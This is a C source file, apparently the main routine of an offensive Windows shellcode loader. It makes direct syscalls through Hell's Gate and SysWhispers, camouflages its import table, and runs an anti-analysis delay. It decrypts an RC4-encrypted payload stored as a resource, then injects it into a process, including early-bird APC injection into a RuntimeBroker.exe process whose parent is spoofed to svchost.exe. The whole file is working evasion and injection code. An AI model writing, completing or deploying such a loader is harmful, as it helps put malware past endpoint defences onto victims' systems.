#include "HellsGate.h"
#include "Common.h"
#include "IatCamouflage.h"
#include "SysWhispers.h"

//#define TEST

/// Comment for remote injection
//#define LOCAL_INJECTION
#define TARGET_PROCESS L"Notepad++.exe"

#ifndef DEBUG
#define ANTI_ANALYSIS
#endif

/// Comment for mapping injection
#define APC_INJECTION
#define SPOOFED_PARENT_PROCESS L"svchost.exe"
#define SACRIFICIAL_PROCESS L"RuntimeBroker.exe"

int main() {
	// Init syscalls for use
	if (InitializeSyscalls() == FALSE) {
		PRINTA("[!] Failed To Initialize Syscalls\n");
		return -1;
	}

	// Used for SysWhispers
	if (!SW3_PopulateSyscallList()) {
		PRINTA("[!] Failed To Populate Syscall List\n");
		return -1;
	}

	// Load user32.dll for use
	LoadLibraryA("user32.dll");

	// Init WinApis for use
	if (InitializeWinApis() == FALSE) {
		PRINTA("[!] Failed To Initialize Windows APIs\n");
		return -1;
	}

	// IAT Camouflage
	IatCamouflage();

#ifdef TEST
#else
	PVOID pPayloadAddress = NULL;
	SIZE_T sPayloadSize = 0;
	DWORD dwPid = 0;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	#ifdef ANTI_ANALYSIS
		// Anti-analysis techniques
		DWORD	seconds = 5;
		DWORD	dwMilliseconds = seconds * 1000;
		if (AntiAnalysis(dwMilliseconds) == FALSE) {
			PRINTA("File Is Being Analyzed!\n");
		}
	#endif

	// Resource reading
	if (LoadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
		PRINTA("[!] Failed To Load Payload From The Resource\n");
		return -1;
	}
	PRINTA("[+] Load Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
	PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);

	// Allocate memory for the payload for the deobfuscation and decryption as the resource section is read-only
	PVOID pAllocatedAddress = (PVOID)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sPayloadSize
	);

	// Copy the payload to the allocated address
	CopyMemoryEx(pAllocatedAddress, pPayloadAddress, sPayloadSize);

	// Deobfuscating the payload
	PRINTA("[#] Press <Enter> To Deobfuscate The Payload ... ");
	GETCHAR();
	SIZE_T	DeobfuscatedPayloadSize = NULL;
	PBYTE	DeobfuscatedPayloadBuffer = NULL;

	PRINTA("[i] Deobfuscating\" ... ");
	if (!Deobfuscate(pAllocatedAddress, sPayloadSize, &DeobfuscatedPayloadBuffer, &DeobfuscatedPayloadSize)) {
		return -1;
	}
	PRINTA("\t>>> Deobfuscated Payload Size : %ld \n\t>>> Deobfuscated Payload Located At : 0x%p \n", (DWORD)DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);

	// Copying the deobfuscated payload to the allocated address
	PRINTA("[#] Press <Enter> To Copy The Deobfuscated Payload ... ");
	GETCHAR();
	CopyMemoryEx(pAllocatedAddress, DeobfuscatedPayloadBuffer, DeobfuscatedPayloadSize);

	// Decrypting the payload
	PRINTA("[#] Press <Enter> To Decrypt The Payload ... ");
	GETCHAR();

	if (!Rc4DecryptionViSystemFunc032(ProtectedKey, pAllocatedAddress, KEY_SIZE, sPayloadSize)) {
		PRINTA("[!] Rc4DecryptionViSystemFunc032 Failed\n");
		return -1;
	}
	PRINTA("[+] DONE \n");
	PRINTA("\t>>> Decrypted Payload Located At : 0x%p \n", pAllocatedAddress);

	#ifdef LOCAL_INJECTION
		RemoteMappingInjectionViaSyscalls(
			GetCurrentProcessHandle(),
			pAllocatedAddress,
			sPayloadSize,
			TRUE
		);
	#else
		#ifndef APC_INJECTION
			// Process enumeration
			PRINTA("[i] Enumerating Processes...\n");
			if (GetRemoteProcessHandle(TARGET_PROCESS, &dwPid, &hProcess) != TRUE) {
				PRINTW(L"[!] Failed To Find Target Process %ls\n", TARGET_PROCESS);
				return -1;
			}
			PRINTW(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);

			RemoteMappingInjectionViaSyscalls(
				hProcess,
				pPayloadAddress,
				sPayloadSize,
				FALSE
			);
		#else 
			// Process enumeration
			PRINTA("[i] Enumerating Processes...\n");
			if (GetRemoteProcessHandle(SPOOFED_PARENT_PROCESS, &dwPid, &hProcess) != TRUE) {
				PRINTW(L"[!] Failed To Find Spoofed Parent Process %ls\n", SPOOFED_PARENT_PROCESS);
				return -1;
			}
			PRINTW(L"[+] Found Spoofed Parent Process: %ls with PID: %d And Handle: %p!\n", SPOOFED_PARENT_PROCESS, dwPid, hProcess);

			// Create the sacrificial process
			/*
				ERROR: 
				[!] CreateProcessA Failed with Error : 2
				[!] CreatePPidSpoofedAndSuspendedProcess Failed With Error : 2
			*/
			if (!CreatePPidSpoofedAndSuspendedProcess(hProcess, SACRIFICIAL_PROCESS, &dwPid, hProcess, hThread)) {
				PRINTA("[!] CreatePPidSpoofedAndSuspendedProcess Failed With Error : %d \n", GetLastError());
				return -1;
			}
			PRINTA("[+] Created Sacrificial Process: %ls with PID: %d And Handle: %p!\n", SACRIFICIAL_PROCESS, dwPid, hProcess);

			// Inject the shellcode to the sacrificial process
			if (!InjectShellcodeToRemoteProcess(hProcess, pPayloadAddress, sPayloadSize, NULL)) {
				PRINTA("[!] InjectShellcodeToRemoteProcess Failed With Error : %d \n", GetLastError());
				return -1;
			}

			// Attack
			if (!RemoteEarlyBirdApcInjectionViaSyscalls(hProcess, SACRIFICIAL_PROCESS, pPayloadAddress, sPayloadSize)) {
				PRINTA("[!] RemoteEarlyBirdApcInjectionViaSyscalls Failed With Error : %d \n", GetLastError());
				return -1;
			}
		#endif
	#endif

#endif

	return 0;
}